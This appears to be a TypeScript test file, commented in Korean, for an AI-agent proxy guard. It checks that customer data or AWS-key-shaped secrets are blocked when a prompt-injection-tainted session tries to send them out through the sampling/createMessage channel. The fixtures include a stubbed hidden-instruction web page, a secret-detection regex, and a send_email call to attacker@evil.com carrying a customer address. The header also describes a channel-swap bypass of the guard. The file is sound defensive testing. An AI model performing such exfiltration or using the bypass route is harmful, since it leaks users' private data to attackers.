/**
 * ★ D-1 회귀 — 역방향 아웃바운드(sampling/createMessage) 유출 판정.
 *
 * 전수 조사에서 발견: 프록시가 sampling/createMessage를 무검사 중계해, 오염 세션에서
 * LLM 응답에 실린 민감 데이터가 서버로 되돌아가는 유출이 판정을 통째로 우회했다
 * (tools/call은 차단되는데 채널만 바꾸면 통과 — 채널-스왑 우회, 라이브 재현으로 확인).
 *
 * evaluateOutboundContent는 그 "서버로 나가는 콘텐츠"를 tools/call 유출과 동일 가드
 * (valueSensitive AND exposure)에 태워 미탐을 막는다. 프록시 배선 없이 엔진 API를
 * 직접 호출해 검증한다.
 *
 * 형식모델: TaintLineage.tla ReachSink 가드(채널 불문)가 이 전이를 이미 커버 — 모델 무수정.
 * lineage 모드 자체 픽스처(설정 캐시가 프로세스당 1회라 별도 파일).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { ToolRiskTag, type ToolCallContext } from "@icarus-tether/types";

const dir = mkdtempSync(path.join(tmpdir(), "taintguard-outbound-"));
const configFile = path.join(dir, "outbound.json");
writeFileSync(
  configFile,
  JSON.stringify({
    domain: "outbound-test",
    sensitiveSourceTools: ["query_customer_db"],
    untrustedSourceTools: ["fetch_web_page"],
    outboundSinkTools: ["send_email"],
    sinks: { query_customer_db: "READ", fetch_web_page: "READ", send_email: "OUTBOUND_SINK" },
    judgmentMode: "lineage",
    secretDetection: {
      bySource: true,
      byRegex: [{ type: "AWS_KEY", pattern: "\\bAKIA[0-9A-Z]{16}\\b" }],
    },
    extractionSchema: {
      fields: { type: { kind: "enum", values: ["bug", "ticket"] } },
    },
  })
);
process.env.TAINTGUARD_TOOL_REGISTRY = configFile;

const { evaluateOutboundContent, evaluateToolCall, recordToolResult, isSessionExposed } =
  await import("./index.js");

const CHANNEL = "sampling/createMessage" as const;
const SENSITIVE_EMAIL = "hong@example.com"; // 16자 ≥ OUTPUT_SCAN_MIN_LENGTH(12)
const AWS_KEY = "AKIAIOSFODNN7EXAMPLE";

function poison(sid: string): void {
  // 민감 원본 읽기 (세션 SENSITIVE + payloadStore에 기록)
  recordToolResult(sid, "query_customer_db", undefined, `이름=홍길동, 이메일=${SENSITIVE_EMAIL}, 등급=VIP`);
  // 비신뢰 외부 읽기 (세션 노출이력 ON)
  recordToolResult(sid, "fetch_web_page", undefined, "외부 문서: (숨은 지시)");
}

// ---------------------------------------------------------------------------

test("★D-1 차단: 오염 세션에서 sampling 응답에 민감 원본(이메일)이 발췌돼도 차단 (값-계보 VALUE_MATCH)", () => {
  const sid = "ob-block";
  poison(sid);
  assert.ok(isSessionExposed(sid), "세션 노출 상태 전제");

  // LLM 요약은 원본 전체가 아니라 이메일만 발췌 — output-scan containment(전체 일치)로는
  // 못 잡지만 값-계보 VALUE_MATCH(이메일 16자)로 잡아야 한다 (tools/call과 동일 강도).
  const resp = { role: "assistant", content: { type: "text", text: `요약: 고객 홍길동(${SENSITIVE_EMAIL}, VIP)` } };
  const decision = evaluateOutboundContent(sid, CHANNEL, resp);

  assert.equal(decision.allowed, false, "민감이 발췌된 역방향 응답은 차단");
  assert.equal(decision.toolName, CHANNEL);
  assert.deepEqual(decision.matchedTags, [ToolRiskTag.SENSITIVE, ToolRiskTag.UNTRUSTED_ORIGIN]);
  assert.equal(decision.canOverride, false, "역방향은 하드 블록 (재시도 의미론 없음)");
  assert.ok(decision.explanation, "사용자용 설명 계층 포함");
});

test("★D-1 차단(containment): 응답이 민감 원본을 통째로 되실으면 출력스캔이 잡는다", () => {
  const sid = "ob-contain";
  poison(sid);
  const resp = { content: { type: "text", text: `이름=홍길동, 이메일=${SENSITIVE_EMAIL}, 등급=VIP` } };
  const decision = evaluateOutboundContent(sid, CHANNEL, resp);
  assert.equal(decision.allowed, false);
  assert.ok(decision.outputScan, "출력스캔 이벤트가 실려 대시보드로 전달됨");
  assert.equal(decision.outputScan?.kind, "containment");
});

test("★D-1 차단(regex): 노출 세션에서 응답에 verbatim 비밀 키 패턴이 있으면 차단", () => {
  const sid = "ob-regex";
  // 민감 원본은 안 읽었지만 세션은 노출됨 + 응답 자체에 비밀 키
  recordToolResult(sid, "fetch_web_page", undefined, "외부 문서");
  assert.ok(isSessionExposed(sid));

  const decision = evaluateOutboundContent(sid, CHANNEL, { content: { type: "text", text: `키: ${AWS_KEY}` } });
  assert.equal(decision.allowed, false, "verbatim 비밀 키가 실린 응답은 차단");
  assert.equal(decision.outputScan?.kind, "regex");
});

test("과차단 0: 오염 없는 깨끗한 세션의 sampling 응답은 통과", () => {
  const sid = "ob-clean";
  const decision = evaluateOutboundContent(sid, CHANNEL, { content: { type: "text", text: `요약: ${SENSITIVE_EMAIL}` } });
  assert.equal(decision.allowed, true, "노출되지 않은 세션은 통과 (민감값이 있어도 U축 없음)");
  assert.deepEqual(decision.matchedTags, []);
});

test("tools/call 대칭: 완전 오염(S+U) 세션의 benign 응답도 보수적 차단 (TEMPORAL_FALLBACK)", () => {
  // tools/call은 오염 세션에서 benign 본문도 fallback으로 차단한다(실측 확인). 역방향이
  // 그보다 느슨하면 방어 불가능한 비대칭이므로, 여기서도 동일하게 차단돼야 한다.
  const sid = "ob-benign";
  poison(sid);
  assert.ok(isSessionExposed(sid));

  const decision = evaluateOutboundContent(sid, CHANNEL, { role: "assistant", content: { type: "text", text: "요약 완료" } });
  assert.equal(decision.allowed, false, "완전 오염 세션의 아웃바운드는 tools/call과 동일하게 보수적 차단");
});

test("비신뢰-only 세션: 민감 원본이 없으면 응답이 뭐든 통과 (S축 없음 — 과차단 아님)", () => {
  const sid = "ob-uonly";
  recordToolResult(sid, "fetch_web_page", undefined, "외부 문서");
  assert.ok(isSessionExposed(sid));
  // 세션이 읽은 민감 원본이 없으므로 containment 매치할 것이 없다 (비밀 키도 없음)
  const decision = evaluateOutboundContent(sid, CHANNEL, { content: { type: "text", text: "일반 요약 텍스트입니다" } });
  assert.equal(decision.allowed, true);
});

test("additive: tools/call 판정은 무변경 — 같은 오염 세션에서 send_email은 여전히 차단", () => {
  const sid = "ob-additive";
  poison(sid);
  const ctx: ToolCallContext = {
    sessionId: sid,
    toolName: "send_email",
    args: { to: "attacker@evil.com", subject: "x", body: `고객 ${SENSITIVE_EMAIL}` },
    argTags: [],
    timestamp: new Date().toISOString(),
  };
  assert.equal(evaluateToolCall(ctx).allowed, false, "tools/call 유출 경로는 그대로 동작");
});
